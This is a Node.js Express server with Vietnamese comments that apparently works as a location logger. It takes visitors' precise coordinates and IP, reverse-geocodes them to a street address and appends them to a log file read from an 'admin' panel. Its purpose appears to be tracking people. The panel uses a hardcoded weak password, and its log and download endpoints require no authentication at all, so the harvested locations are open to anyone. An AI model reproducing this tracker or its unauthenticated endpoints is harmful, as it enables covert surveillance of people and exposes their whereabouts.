import express from "express";
import fetch from "node-fetch";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;
const ADMIN_PASSWORD = "1234567890"; // <-- THAY ĐỔI MẬT KHẨU NÀY

// --- Middlewares ---
app.use(express.json());
app.use(express.urlencoded({ extended: true })); // Để đọc data từ form đăng nhập
app.use(express.static(path.join(__dirname, "public")));

// --- PUBLIC API Endpoint ---
app.post("/api/log-precise-location", async (req, res) => {
  try {
    const { latitude, longitude } = req.body;
    const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    const geoResponse = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`,
      {
        headers: { "User-Agent": "PreciseLogger/1.0" },
      }
    );
    const geoData = await geoResponse.json();
    const detailedAddress = geoData.display_name || "N/A";

    const logData = `
          [${new Date().toISOString()}] User IP: ${userIP}
          Precise Coordinates: Latitude: ${latitude}, Longitude: ${longitude}
          Detailed Address from Coords: ${detailedAddress}
        `;

    fs.appendFileSync("precise_logs.txt", logData + "\n\n", "utf8");
    res.status(200).json({ message: "Location logged successfully" });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Internal Server Error" });
  }
});

// --- ADMIN ROUTES ---
// Route để hiển thị trang đăng nhập
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Route để xử lý form đăng nhập
app.post("/admin/login", (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    // Nếu đúng mật khẩu, chuyển hướng đến trang dashboard
    res.redirect("/admin/dashboard");
  } else {
    // Nếu sai, gửi lại trang đăng nhập với thông báo lỗi
    res.send(`<h1>Sai mật khẩu!</h1><a href="/admin">Thử lại</a>`);
  }
});

// Route để hiển thị trang dashboard (sau khi đăng nhập thành công)
app.get("/admin/dashboard", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "dashboard.html"));
});

// API để trang dashboard lấy nội dung file log
app.get("/admin/api/logs", (req, res) => {
  const logFilePath = path.join(__dirname, "precise_logs.txt");
  if (fs.existsSync(logFilePath)) {
    res.sendFile(logFilePath);
  } else {
    res.send("File log chưa được tạo.");
  }
});

// API để tải file log
app.get("/admin/api/download", (req, res) => {
  const logFilePath = path.join(__dirname, "precise_logs.txt");
  res.download(logFilePath); // Tự động gửi file về trình duyệt
});

// --- Khởi động Server ---
app.listen(PORT, () => {
  console.log(`Server đa năng đang chạy tại http://localhost:${PORT}`);
  console.log("Truy cập trang admin tại http://localhost:3000/admin");
});
